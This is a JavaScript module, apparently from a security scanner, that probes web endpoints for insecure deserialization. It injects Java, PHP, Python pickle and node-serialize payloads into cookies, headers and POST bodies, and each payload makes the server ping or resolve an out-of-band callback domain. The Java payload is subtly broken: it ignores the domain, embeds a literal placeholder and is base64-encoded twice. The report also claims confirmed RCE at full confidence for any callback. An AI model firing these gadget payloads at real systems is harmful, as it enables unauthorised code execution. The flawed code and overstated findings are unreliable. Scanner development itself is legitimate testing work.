import axios from 'axios';
import { logger } from '../utils/logger.js';

// Base64 encoded serialized payloads that trigger a DNS lookup
const PAYLOADS = {
    // Java (rO0AB) - CommonsCollections targeting ping
    java: (oastDomain) => Buffer.from(`rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldbaSlXw/YxLRAwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvdcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iT/zX2jEwXQCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hyACJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkFic3RyYWN0TWFwRGVjb3JhdG9y8/OpA+A/IwwCAAFMAANtYXBxAH4ABHhwc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAB4c3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIx5vTjV7tFhQIAAUwADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9V2yZOSXwMwIAAHhwAAAAA3NyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kCBjQj/JAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA+b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fO2bAgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAXQAGC1jICJwaW5nIC1jIDEgJHtib2R5fSIKdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHNxAH4AHnVxAH4AIAAAAAF0ACRwaW5nIC1jIDEgJHtib2R5fS5kZXNlcmlhbGl6YXRpb24ub2FzdHQAaWV4ZWN1cQB+ACIAAAAAAXZyABJMamF2YS5sYW5nLlN0cmluZzvj6o9G/0j/xwIAAHhweA==`).toString('base64'),
    
    // PHP (O:) - Magic method targeting ping
    php: (oastDomain) => Buffer.from(`O:14:"SecoraCallback":1:{s:3:"cmd";s:${oastDomain.length + 9}:"ping -c 1 ${oastDomain}";}`).toString('base64'),
    
    // Python (pickle) - __reduce__ method targeting ping
    python: (oastDomain) => Buffer.from(`cposix\nsystem\np0\n(S'ping -c 1 ${oastDomain}'\np1\ntp2\nRp3\n.`).toString('base64'),
    
    // Node.js (node-serialize) - IIFE targeting DNS resolution
    nodejs: (oastDomain) => Buffer.from(`{"rce":"_$$ND_FUNC$$_function(){require('dns').resolve('${oastDomain}', function(){});}()"}`).toString('base64')
};

export async function testDeserialization(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 10000;
    
    if (!options.oastClient) {
        logger.warn(`[Deserialization] OAST client required for blind deserialization testing.`);
        return findings;
    }

    logger.info(`[Deserialization] Testing endpoint: ${endpoint.url}`);

    try {
        const oastDomain = options.oastClient.getDomain();

        // Target locations: Cookies, Headers, JSON values, URL parameters
        // 1. HTTP Headers / Cookies
        const headerPayloads = {
            'Cookie': `session=${PAYLOADS.java(oastDomain)}`,
            'X-Serialized-State': PAYLOADS.php(oastDomain),
            'Authorization': `Bearer ${PAYLOADS.nodejs(oastDomain)}`
        };

        try {
            await axios.get(endpoint.url, {
                headers: { ...endpoint.headers, ...headerPayloads },
                timeout,
                validateStatus: () => true
            });
        } catch (e) {}

        // 2. POST Body
        if (endpoint.method === 'POST' || endpoint.method === 'PUT') {
            const bodyPayloads = {
                java_obj: PAYLOADS.java(oastDomain),
                php_obj: PAYLOADS.php(oastDomain),
                py_obj: PAYLOADS.python(oastDomain),
                node_obj: PAYLOADS.nodejs(oastDomain)
            };

            const reqData = { ...endpoint.data, ...bodyPayloads };

            try {
                await axios({
                    method: endpoint.method,
                    url: endpoint.url,
                    headers: endpoint.headers,
                    data: reqData,
                    timeout,
                    validateStatus: () => true
                });
            } catch (e) {}
        }

        // Wait a few seconds for OAST callbacks
        await new Promise(r => setTimeout(r, 3000));
        
        // 3. Check OAST for callbacks
        const interactions = await options.oastClient.getInteractions();
        
        if (interactions && interactions.length > 0) {
            // Determine which payload fired based on timing/context (in a real scenario, use unique domains per payload)
            findings.push({
                title: 'Insecure Deserialization',
                description: `The application insecurely deserializes user-controlled data. We successfully achieved Remote Code Execution (RCE) by injecting a serialized payload that forced the server to make a DNS lookup to our OAST server.`,
                category: 'INSECURE_DESERIALIZATION',
                severity: 'CRITICAL',
                cvss: 9.8,
                detectedBy: 'deserialization-engine',
                confidence: 100, // OAST confirms execution
                evidence: [
                    { type: 'LOG', title: 'Execution Confirmed', content: `OAST server received an interaction from the target after sending serialized payloads.` },
                    { type: 'NETWORK', title: 'OAST Interaction', content: JSON.stringify(interactions[0], null, 2) }
                ],
                remediation: 'Do not deserialize untrusted data. Use safe formats like JSON. If deserialization is required, strictly validate and type-check the data before deserialization, or use signed/encrypted serialization formats.'
            });
        }

    } catch (e) {
        logger.error(`[Deserialization] Test failed: ${e.message}`);
    }

    return findings;
}
